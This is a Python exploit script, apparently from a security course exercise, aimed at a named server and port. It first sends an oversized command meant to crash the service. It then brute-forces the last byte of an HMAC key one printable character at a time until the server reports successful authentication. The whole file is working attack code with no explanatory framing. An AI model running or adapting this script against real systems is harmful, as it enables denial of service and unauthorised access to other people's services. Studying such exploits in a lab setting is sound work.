

import socket
import hmac
import hashlib
import time


USER_NAME = b"241153"
TAG = b"ClientCmd"
COMMAND = b'a'*31
DILIMIT = b"|"

HOST = 'device1.vikaa.fi'  # The server's hostname or IP address
PORT = 35984  # The port used by the server


printable_characters = []

for i in range(32, 127):
    printable_characters.append(chr(i).encode("ascii"))


def crash_server():
    command = b'a' * 89
    key = 'bbbbbbbbbbbbbbbbbbbb'
    hmac = "kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(b'241153;' + command + key.encode("utf-8") + b';' + hmac.encode("utf-8") + b'\n')

        print('data sent')

        data = s.recv(1024)
        print("data = ", data)


def generate_hmac(sec_key):

    total_parameter = TAG + DILIMIT + USER_NAME + DILIMIT + COMMAND + sec_key
    generated_hmac = hmac.new(sec_key, total_parameter, hashlib.sha256).hexdigest()

    return generated_hmac

crash_server()
time.sleep(10)
for i in range(len(printable_characters)):
    key = b'b'*18 + b'\0' + printable_characters[i]
    print("key = ", key)
    hmacc = generate_hmac(key)
    print('hamc = ', hmacc)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))

        print('server connected')

        s.sendall(b'241153;' + COMMAND + b'b'*18 + b';' + hmacc.encode("utf-8") + b'\n')

        print('data sent')

        data = s.recv(1024)
        if "Authentication successful" in data.decode("utf-8"):
            print(printable_characters[i])
            break

